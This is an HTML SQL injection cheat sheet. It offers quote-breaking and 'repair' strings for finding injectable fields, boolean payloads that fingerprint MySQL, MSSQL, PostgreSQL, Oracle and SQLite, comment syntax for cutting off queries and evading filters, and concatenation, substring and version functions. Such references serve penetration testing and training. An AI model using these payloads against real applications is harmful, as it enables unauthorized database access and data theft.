<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Cheatsheet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            background: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1, h2 {
            color: rgb(184, 233, 90);
            text-shadow: rgba(0, 0, 0, 0.1) 0px 1px 1px, rgba(86, 111, 15, 0.1) 0px 0px 5px, rgba(86, 111, 15, 0.1) 0px 0px 10px;
            animation: fadeIn 2s ease-in-out;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background: #f4f4f4;
        }
        tr:nth-child(even) {
            background: #f9f9f9;
        }
        a {
            color: #3498db;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SQL Injection Cheatsheet</h1>
        <p>This is an SQL injection cheatsheet with tried and true payloads / techniques that cover the 5 most popular database variants and their derivatives (MySQL, PostgreSQL, MSSQL/SQL Server, Oracle, SQLite).</p>

        <h2>Pronunciation Guide</h2>
        <ul>
            <li>ESS CUE ELL ‚úî</li>
            <li>SEE KWUHL ‚úò</li>
            <li>SQUEAL ¬Ø\_(„ÉÑ)_/¬Ø</li>
            <li>SQUIRREL üêøÔ∏è</li>
        </ul>

        <h2>Break & Repair Method</h2>
        <p>A simplistic but generally reliable method for finding basic SQL injections.</p>
        <p>First, ‚Äúbreak‚Äù the statement by injecting a single or double quote into an otherwise valid value (e.g. username=admin‚Äô).</p>
        <p>Then, replace the injected quote with each of the following ‚Äúrepairs‚Äù in turn, to see if one results in the original (uninjected) response:</p>
        <table>
            <thead>
                <tr>
                    <th>Repair</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>' '</td>
                </tr>
                <tr>
                    <td>||</td>
                </tr>
                <tr>
                    <td>+</td>
                </tr>
                <tr>
                    <td>' AND '1'='1</td>
                </tr>
                <tr>
                    <td>-- -</td>
                </tr>
            </tbody>
        </table>
        <p>In some cases, none of our ‚Äúrepairs‚Äù work because we are injecting into an integer value. In these cases, try the following repairs. Note that each one begins with a space:</p>
        <table>
            <thead>
                <tr>
                    <th>Repair</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>-- -</td>
                </tr>
                <tr>
                    <td>AND 1=1</td>
                </tr>
                <tr>
                    <td>AND 1=1 -- -</td>
                </tr>
            </tbody>
        </table>

        <h2>Identifying Variants</h2>
        <p>Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQL) can be identified by injecting these payloads in order until a positive result is returned:</p>
        <table>
            <thead>
                <tr>
                    <th>Order</th>
                    <th>Payload</th>
                    <th>If Valid</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>1</td>
                    <td>AND 'foo' 'bar' = 'foobar'</td>
                    <td>MySQL</td>
                </tr>
                <tr>
                    <td>2</td>
                    <td>AND DATALENGTH('foo') = 3</td>
                    <td>MSSQL</td>
                </tr>
                <tr>
                    <td>3</td>
                    <td>AND TO_HEX(1) = '1'</td>
                    <td>PostgreSQL</td>
                </tr>
                <tr>
                    <td>4</td>
                    <td>AND LENGTHB('foo') = '3'</td>
                    <td>Oracle</td>
                </tr>
                <tr>
                    <td>5</td>
                    <td>AND GLOB('foo*', 'foobar') = 1</td>
                    <td>SQLite</td>
                </tr>
            </tbody>
        </table>

        <h2>Comments</h2>
        <p>This comment syntax can be used to add comments to SQL statements, useful for commenting out anything after an injection, as well as bypassing certain filters. Note that ‚Äì comments require a space after the ‚Äì to be valid, and /*comment*/ are in-line comments.</p>
        <table>
            <thead>
                <tr>
                    <th>Variant</th>
                    <th>Syntax</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>MySQL</td>
                    <td># comment<br>-- comment<br>/*comment*/</td>
                </tr>
                <tr>
                    <td>PostgreSQL</td>
                    <td>-- comment<br>/*comment*/</td>
                </tr>
                <tr>
                    <td>MSSQL</td>
                    <td>-- comment<br>/*comment*/</td>
                </tr>
                <tr>
                    <td>Oracle</td>
                    <td>-- comment<br>/*comment*/</td>
                </tr>
                <tr>
                    <td>SQLite</td>
                    <td>-- comment<br>/*comment*/</td>
                </tr>
            </tbody>
        </table>

        <h2>String Concatenation</h2>
        <p>These functions / operators can be used to concatenate two or more strings together.</p>
        <table>
            <thead>
                <tr>
                    <th>Variant</th>
                    <th>Function / Operator</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>MySQL</td>
                    <td>'foo' 'bar'<br>CONCAT('foo', 'bar')</td>
                </tr>
                <tr>
                    <td>PostgreSQL</td>
                    <td>'foo'||'bar'<br>CONCAT('foo', 'bar')</td>
                </tr>
                <tr>
                    <td>MSSQL</td>
                    <td>'foo'+'bar'<br>CONCAT('foo', 'bar')</td>
                </tr>
                <tr>
                    <td>Oracle</td>
                    <td>'foo'||'bar'<br>CONCAT('foo', 'bar')</td>
                </tr>
                <tr>
                    <td>SQLite</td>
                    <td>'foo'||'bar'<br>CONCAT('foo', 'bar')</td>
                </tr>
            </tbody>
        </table>

        <h2>Substring</h2>
        <p>These functions can be used to select a substring of a string. The START value should be set to 1 (not 0) to start the substring from the first character.</p>
        <table>
            <thead>
                <tr>
                    <th>Variant</th>
                    <th>Function</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>MySQL</td>
                    <td>SUBSTRING('foobar', START, LENGTH)<br>SUBSTR('foobar', START, LENGTH)</td>
                </tr>
                <tr>
                    <td>PostgreSQL</td>
                    <td>SUBSTRING('foobar', START, LENGTH)<br>SUBSTR('foobar', START, LENGTH)</td>
                </tr>
                <tr>
                    <td>MSSQL</td>
                    <td>SUBSTRING('foobar', START, LENGTH)</td>
                </tr>
                <tr>
                    <td>Oracle</td>
                    <td>SUBSTR('foobar', START, LENGTH)</td>
                </tr>
                <tr>
                    <td>SQLite</td>
                    <td>SUBSTR('foobar', START, LENGTH)</td>
                </tr>
            </tbody>
        </table>

        <h2>Database Version</h2>
        <p>These functions can be used to retrieve the current database version. If the version cannot be obtained directly, it can sometimes be retrieved by using these functions in conjunction with SELECT.</p>
        <table>
            <thead>
                <tr>
                    <th>Variant</th>
                    <th>Function</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>MySQL</td>
                    <td>SELECT @@version<br>SELECT VERSION()</td>
                </tr>
                <tr>
                    <td>PostgreSQL</td>
                    <td>SELECT version()</td>
                </tr>
                <tr>
                    <td>MSSQL</td>
                    <td>SELECT @@version<br>SELECT SERVERPROPERTY('ProductVersion')</td>
                </tr>
                <tr>
                    <td>Oracle</td>
                    <td>SELECT * FROM v$version</td>
                </tr>
                <tr>
                    <td>SQLite</td>
                    <td>SELECT sqlite_version()</td>
                </tr>
            </tbody>
        </table>
    </div>
</body>
</html>
